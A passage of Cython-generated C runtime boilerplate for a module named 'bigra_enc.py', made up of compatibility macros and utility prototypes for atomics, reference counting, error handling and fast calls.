  #define __Pyx_PyLong_IsCompact(x)  (Py_SIZE(x) == 0 || Py_SIZE(x) == 1 || Py_SIZE(x) == -1)
  #define __Pyx_PyLong_CompactValue(x)\
        ((Py_SIZE(x) == 0) ? (sdigit) 0 : ((Py_SIZE(x) < 0) ? -(sdigit)__Pyx_PyLong_Digits(x)[0] : (sdigit)__Pyx_PyLong_Digits(x)[0]))
  typedef sdigit  __Pyx_compact_pylong;
  typedef digit  __Pyx_compact_upylong;
  #endif
  #if PY_VERSION_HEX >= 0x030C00A5
  #define __Pyx_PyLong_Digits(x)  (((PyLongObject*)x)->long_value.ob_digit)
  #else
  #define __Pyx_PyLong_Digits(x)  (((PyLongObject*)x)->ob_digit)
  #endif
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_UTF8
  #define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#elif __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
  #define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeASCII(c_str, size, NULL)
#else
  #define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
/* PretendToInitialize */
#ifdef __cplusplus
#include <type_traits>
template <typename T>
static void __Pyx_pretend_to_initialize(T* ptr) {
#if __cplusplus > 201103L
    if ((std::is_trivially_default_constructible<T>::value))
#endif
        *ptr = T();
    (void)ptr;
}
#else
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }
#endif


#if !CYTHON_USE_MODULE_STATE
static PyObject *__pyx_m = NULL;
#endif
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * const __pyx_cfilenm = __FILE__;
static const char *__pyx_filename;

/* #### Code section: filename_table ### */

static const char* const __pyx_f[] = {
  "bigra_enc.py",
};
/* #### Code section: utility_code_proto_before_types ### */
/* CriticalSections.proto */
#if !CYTHON_COMPILING_IN_CPYTHON_FREETHREADING
#define __Pyx_PyCriticalSection void*
#define __Pyx_PyCriticalSection2 void*
#define __Pyx_PyCriticalSection_Begin1(cs, arg) (void)cs
#define __Pyx_PyCriticalSection_Begin2(cs, arg1, arg2) (void)cs
#define __Pyx_PyCriticalSection_End1(cs)
#define __Pyx_PyCriticalSection_End2(cs)
#else
#define __Pyx_PyCriticalSection PyCriticalSection
#define __Pyx_PyCriticalSection2 PyCriticalSection2
#define __Pyx_PyCriticalSection_Begin1 PyCriticalSection_Begin
#define __Pyx_PyCriticalSection_Begin2 PyCriticalSection2_Begin
#define __Pyx_PyCriticalSection_End1 PyCriticalSection_End
#define __Pyx_PyCriticalSection_End2 PyCriticalSection2_End
#endif
#if PY_VERSION_HEX < 0x030d0000 || CYTHON_COMPILING_IN_LIMITED_API
#define __Pyx_BEGIN_CRITICAL_SECTION(o) {
#define __Pyx_END_CRITICAL_SECTION() }
#else
#define __Pyx_BEGIN_CRITICAL_SECTION Py_BEGIN_CRITICAL_SECTION
#define __Pyx_END_CRITICAL_SECTION Py_END_CRITICAL_SECTION
#endif

/* Atomics.proto */
#include <pythread.h>
#ifndef CYTHON_ATOMICS
    #define CYTHON_ATOMICS 1
#endif
#define __PYX_CYTHON_ATOMICS_ENABLED() CYTHON_ATOMICS
#define __PYX_GET_CYTHON_COMPILING_IN_CPYTHON_FREETHREADING() CYTHON_COMPILING_IN_CPYTHON_FREETHREADING
#define __pyx_atomic_int_type int
#define __pyx_nonatomic_int_type int
#if CYTHON_ATOMICS && (defined(__STDC_VERSION__) &&\
                        (__STDC_VERSION__ >= 201112L) &&\
                        !defined(__STDC_NO_ATOMICS__))
    #include <stdatomic.h>
#elif CYTHON_ATOMICS && (defined(__cplusplus) && (\
                    (__cplusplus >= 201103L) ||\
                    (defined(_MSC_VER) && _MSC_VER >= 1700)))
    #include <atomic>
#endif
#if CYTHON_ATOMICS && (defined(__STDC_VERSION__) &&\
                        (__STDC_VERSION__ >= 201112L) &&\
                        !defined(__STDC_NO_ATOMICS__) &&\
                       ATOMIC_INT_LOCK_FREE == 2)
    #undef __pyx_atomic_int_type
    #define __pyx_atomic_int_type atomic_int
    #define __pyx_atomic_ptr_type atomic_uintptr_t
    #define __pyx_nonatomic_ptr_type uintptr_t
    #define __pyx_atomic_incr_relaxed(value) atomic_fetch_add_explicit(value, 1, memory_order_relaxed)
    #define __pyx_atomic_incr_acq_rel(value) atomic_fetch_add_explicit(value, 1, memory_order_acq_rel)
    #define __pyx_atomic_decr_acq_rel(value) atomic_fetch_sub_explicit(value, 1, memory_order_acq_rel)
    #define __pyx_atomic_sub(value, arg) atomic_fetch_sub(value, arg)
    #define __pyx_atomic_int_cmp_exchange(value, expected, desired) atomic_compare_exchange_strong(value, expected, desired)
    #define __pyx_atomic_load(value) atomic_load(value)
    #define __pyx_atomic_store(value, new_value) atomic_store(value, new_value)
    #define __pyx_atomic_pointer_load_relaxed(value) atomic_load_explicit(value, memory_order_relaxed)
    #define __pyx_atomic_pointer_load_acquire(value) atomic_load_explicit(value, memory_order_acquire)
    #define __pyx_atomic_pointer_exchange(value, new_value) atomic_exchange(value, (__pyx_nonatomic_ptr_type)new_value)
    #if defined(__PYX_DEBUG_ATOMICS) && defined(_MSC_VER)
        #pragma message ("Using standard C atomics")
    #elif defined(__PYX_DEBUG_ATOMICS)
        #warning "Using standard C atomics"
    #endif
#elif CYTHON_ATOMICS && (defined(__cplusplus) && (\
                    (__cplusplus >= 201103L) ||\
\
                    (defined(_MSC_VER) && _MSC_VER >= 1700)) &&\
                    ATOMIC_INT_LOCK_FREE == 2)
    #undef __pyx_atomic_int_type
    #define __pyx_atomic_int_type std::atomic_int
    #define __pyx_atomic_ptr_type std::atomic_uintptr_t
    #define __pyx_nonatomic_ptr_type uintptr_t
    #define __pyx_atomic_incr_relaxed(value) std::atomic_fetch_add_explicit(value, 1, std::memory_order_relaxed)
    #define __pyx_atomic_incr_acq_rel(value) std::atomic_fetch_add_explicit(value, 1, std::memory_order_acq_rel)
    #define __pyx_atomic_decr_acq_rel(value) std::atomic_fetch_sub_explicit(value, 1, std::memory_order_acq_rel)
    #define __pyx_atomic_sub(value, arg) std::atomic_fetch_sub(value, arg)
    #define __pyx_atomic_int_cmp_exchange(value, expected, desired) std::atomic_compare_exchange_strong(value, expected, desired)
    #define __pyx_atomic_load(value) std::atomic_load(value)
    #define __pyx_atomic_store(value, new_value) std::atomic_store(value, new_value)
    #define __pyx_atomic_pointer_load_relaxed(value) std::atomic_load_explicit(value, std::memory_order_relaxed)
    #define __pyx_atomic_pointer_load_acquire(value) std::atomic_load_explicit(value, std::memory_order_acquire)
    #define __pyx_atomic_pointer_exchange(value, new_value) std::atomic_exchange(value, (__pyx_nonatomic_ptr_type)new_value)
    #if defined(__PYX_DEBUG_ATOMICS) && defined(_MSC_VER)
        #pragma message ("Using standard C++ atomics")
    #elif defined(__PYX_DEBUG_ATOMICS)
        #warning "Using standard C++ atomics"
    #endif
#elif CYTHON_ATOMICS && (__GNUC__ >= 5 || (__GNUC__ == 4 &&\
                    (__GNUC_MINOR__ > 1 ||\
                    (__GNUC_MINOR__ == 1 && __GNUC_PATCHLEVEL__ >= 2))))
    #define __pyx_atomic_ptr_type void*
    #define __pyx_atomic_incr_relaxed(value) __sync_fetch_and_add(value, 1)
    #define __pyx_atomic_incr_acq_rel(value) __sync_fetch_and_add(value, 1)
    #define __pyx_atomic_decr_acq_rel(value) __sync_fetch_and_sub(value, 1)
    #define __pyx_atomic_sub(value, arg) __sync_fetch_and_sub(value, arg)
    static CYTHON_INLINE int __pyx_atomic_int_cmp_exchange(__pyx_atomic_int_type* value, __pyx_nonatomic_int_type* expected, __pyx_nonatomic_int_type desired) {
        __pyx_nonatomic_int_type old = __sync_val_compare_and_swap(value, *expected, desired);
        int result = old == *expected;
        *expected = old;
        return result;
    }
    #define __pyx_atomic_load(value) __sync_fetch_and_add(value, 0)
    #define __pyx_atomic_store(value, new_value) __sync_lock_test_and_set(value, new_value)
    #define __pyx_atomic_pointer_load_relaxed(value) __sync_fetch_and_add(value, 0)
    #define __pyx_atomic_pointer_load_acquire(value) __sync_fetch_and_add(value, 0)
    #define __pyx_atomic_pointer_exchange(value, new_value) __sync_lock_test_and_set(value, (__pyx_atomic_ptr_type)new_value)
    #ifdef __PYX_DEBUG_ATOMICS
        #warning "Using GNU atomics"
    #endif
#elif CYTHON_ATOMICS && defined(_MSC_VER)
    #include <intrin.h>
    #undef __pyx_atomic_int_type
    #define __pyx_atomic_int_type long
    #define __pyx_atomic_ptr_type void*
    #undef __pyx_nonatomic_int_type
    #define __pyx_nonatomic_int_type long
    #pragma intrinsic (_InterlockedExchangeAdd, _InterlockedExchange, _InterlockedCompareExchange, _InterlockedCompareExchangePointer, _InterlockedExchangePointer)
    #define __pyx_atomic_incr_relaxed(value) _InterlockedExchangeAdd(value, 1)
    #define __pyx_atomic_incr_acq_rel(value) _InterlockedExchangeAdd(value, 1)
    #define __pyx_atomic_decr_acq_rel(value) _InterlockedExchangeAdd(value, -1)
    #define __pyx_atomic_sub(value, arg) _InterlockedExchangeAdd(value, -arg)
    static CYTHON_INLINE int __pyx_atomic_int_cmp_exchange(__pyx_atomic_int_type* value, __pyx_nonatomic_int_type* expected, __pyx_nonatomic_int_type desired) {
        __pyx_nonatomic_int_type old = _InterlockedCompareExchange(value, desired, *expected);
        int result = old == *expected;
        *expected = old;
        return result;
    }
    #define __pyx_atomic_load(value) _InterlockedExchangeAdd(value, 0)
    #define __pyx_atomic_store(value, new_value) _InterlockedExchange(value, new_value)
    #define __pyx_atomic_pointer_load_relaxed(value) *(void * volatile *)value
    #define __pyx_atomic_pointer_load_acquire(value) _InterlockedCompareExchangePointer(value, 0, 0)
    #define __pyx_atomic_pointer_exchange(value, new_value) _InterlockedExchangePointer(value, (__pyx_atomic_ptr_type)new_value)
    #ifdef __PYX_DEBUG_ATOMICS
        #pragma message ("Using MSVC atomics")
    #endif
#else
    #undef CYTHON_ATOMICS
    #define CYTHON_ATOMICS 0
    #ifdef __PYX_DEBUG_ATOMICS
        #warning "Not using atomics"
    #endif
#endif
#if CYTHON_ATOMICS
    #define __pyx_add_acquisition_count(memview)\
             __pyx_atomic_incr_relaxed(__pyx_get_slice_count_pointer(memview))
    #define __pyx_sub_acquisition_count(memview)\
            __pyx_atomic_decr_acq_rel(__pyx_get_slice_count_pointer(memview))
#else
    #define __pyx_add_acquisition_count(memview)\
            __pyx_add_acquisition_count_locked(__pyx_get_slice_count_pointer(memview), memview->lock)
    #define __pyx_sub_acquisition_count(memview)\
            __pyx_sub_acquisition_count_locked(__pyx_get_slice_count_pointer(memview), memview->lock)
#endif

/* #### Code section: numeric_typedefs ### */
/* #### Code section: complex_type_declarations ### */
/* #### Code section: type_declarations ### */

/*--- Type declarations ---*/
/* #### Code section: utility_code_proto ### */

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, Py_ssize_t);
    void (*DECREF)(void*, PyObject*, Py_ssize_t);
    void (*GOTREF)(void*, PyObject*, Py_ssize_t);
    void (*GIVEREF)(void*, PyObject*, Py_ssize_t);
    void* (*SetupContext)(const char*, Py_ssize_t, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__));\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__));\
          }
  #define __Pyx_RefNannyFinishContextNogil() {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __Pyx_RefNannyFinishContext();\
              PyGILState_Release(__pyx_gilstate_save);\
          }
  #define __Pyx_RefNannyFinishContextNogil() {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __Pyx_RefNannyFinishContext();\
              PyGILState_Release(__pyx_gilstate_save);\
          }
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))
  #define __Pyx_XINCREF(r)  do { if((r) == NULL); else {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) == NULL); else {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) == NULL); else {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) == NULL); else {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContextNogil()
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_Py_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; Py_XDECREF(tmp);\
    } while (0)
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* IncludeStringH.proto */
#include <string.h>

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* ImportDottedModule.proto */
static PyObject *__Pyx_ImportDottedModule(PyObject *name, PyObject *parts_tuple);
static PyObject *__Pyx_ImportDottedModule_WalkParts(PyObject *module, PyObject *name, PyObject *parts_tuple);

/* PyExec.proto */
static PyObject* __Pyx_PyExec3(PyObject*, PyObject*, PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject*, PyObject*);

/* PyExecGlobals.proto */
static PyObject* __Pyx_PyExecGlobals(PyObject*);

/* PyErrExceptionMatches.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#if PY_VERSION_HEX >= 0x030C00A6
#define __Pyx_PyErr_Occurred()  (__pyx_tstate->current_exception != NULL)
#define __Pyx_PyErr_CurrentExceptionType()  (__pyx_tstate->current_exception ? (PyObject*) Py_TYPE(__pyx_tstate->current_exception) : (PyObject*) NULL)
#else
#define __Pyx_PyErr_Occurred()  (__pyx_tstate->curexc_type != NULL)
#define __Pyx_PyErr_CurrentExceptionType()  (__pyx_tstate->curexc_type)
#endif
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  (PyErr_Occurred() != NULL)
#define __Pyx_PyErr_CurrentExceptionType()  PyErr_Occurred()
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A6
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* PyObjectGetAttrStrNoError.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStrNoError(PyObject* obj, PyObject* attr_name);

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_mstate_global->__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#if !CYTHON_VECTORCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject *const *args, Py_ssize_t nargs, PyObject *kwargs);
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if !CYTHON_VECTORCALL
#if PY_VERSION_HEX >= 0x03080000
  #include "frameobject.h"
  #define __Pxy_PyFrame_Initialize_Offsets()
  #define __Pyx_PyFrame_GetLocalsplus(frame)  ((frame)->f_localsplus)
#else
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif
#endif
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectFastCall.proto */
#define __Pyx_PyObject_FastCall(func, args, nargs)  __Pyx_PyObject_FastCallDict(func, args, (size_t)(nargs), NULL)
static CYTHON_INLINE PyObject* __Pyx_PyObject_FastCallDict(PyObject *func, PyObject * const*args, size_t nargs, PyObject *kwargs);

/* CLineInTraceback.proto */
#if CYTHON_CLINE_IN_TRACEBACK && CYTHON_CLINE_IN_TRACEBACK_RUNTIME
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#else
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#endif

/* CodeObjectCache.proto */
#if CYTHON_COMPILING_IN_LIMITED_API
typedef PyObject __Pyx_CachedCodeObjectType;
#else
typedef PyCodeObject __Pyx_CachedCodeObjectType;
#endif
typedef struct {
    __Pyx_CachedCodeObjectType* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING
    __pyx_atomic_int_type accessor_count;
  #endif
};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static __Pyx_CachedCodeObjectType *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, __Pyx_CachedCodeObjectType* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* FormatTypeName.proto */
#if CYTHON_COMPILING_IN_LIMITED_API
typedef PyObject *__Pyx_TypeName;
#define __Pyx_FMT_TYPENAME "%U"
#define __Pyx_DECREF_TypeName(obj) Py_XDECREF(obj)
#if __PYX_LIMITED_VERSION_HEX >= 0x030d0000
#define __Pyx_PyType_GetFullyQualifiedName PyType_GetFullyQualifiedName
#else
static __Pyx_TypeName __Pyx_PyType_GetFullyQualifiedName(PyTypeObject* tp);
#endif
#else  // !LIMITED_API
typedef const char *__Pyx_TypeName;
#define __Pyx_FMT_TYPENAME "%.200s"
#define __Pyx_PyType_GetFullyQualifiedName(tp) ((tp)->tp_name)
#define __Pyx_DECREF_TypeName(obj)
#endif

/* GCCDiagnostics.proto */
#if !defined(__INTEL_COMPILER) && defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* PyObjectVectorCallKwBuilder.proto */
CYTHON_UNUSED static int __Pyx_VectorcallBuilder_AddArg_Check(PyObject *key, PyObject *value, PyObject *builder, PyObject **args, int n);
#if CYTHON_VECTORCALL
#if PY_VERSION_HEX >= 0x03090000
#define __Pyx_Object_Vectorcall_CallFromBuilder PyObject_Vectorcall
#else
#define __Pyx_Object_Vectorcall_CallFromBuilder _PyObject_Vectorcall
#endif
#define __Pyx_MakeVectorcallBuilderKwds(n) PyTuple_New(n)
static int __Pyx_VectorcallBuilder_AddArg(PyObject *key, PyObject *value, PyObject *builder, PyObject **args, int n);
static int __Pyx_VectorcallBuilder_AddArgStr(const char *key, PyObject *value, PyObject *builder, PyObject **args, int n);
#else
#define __Pyx_Object_Vectorcall_CallFromBuilder __Pyx_PyObject_FastCallDict
#define __Pyx_MakeVectorcallBuilderKwds(n) __Pyx_PyDict_NewPresized(n)
#define __Pyx_VectorcallBuilder_AddArg(key, value, builder, args, n) PyDict_SetItem(builder, key, value)
#define __Pyx_VectorcallBuilder_AddArgStr(key, value, builder, args, n) PyDict_SetItemString(builder, key, value)
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyLong_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyLong_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyLong_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
#define __Pyx_TypeCheck2(obj, type1, type2) __Pyx_IsAnySubtype2(Py_TYPE(obj), (PyTypeObject *)type1, (PyTypeObject *)type2)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_IsAnySubtype2(PyTypeObject *cls, PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_TypeCheck2(obj, type1, type2) (PyObject_TypeCheck(obj, (PyTypeObject *)type1) || PyObject_TypeCheck(obj, (PyTypeObject *)type2))
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2) {
    return PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2);
}
#endif
#define __Pyx_PyErr_ExceptionMatches2(err1, err2)  __Pyx_PyErr_GivenExceptionMatches2(__Pyx_PyErr_CurrentExceptionType(), err1, err2)
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)
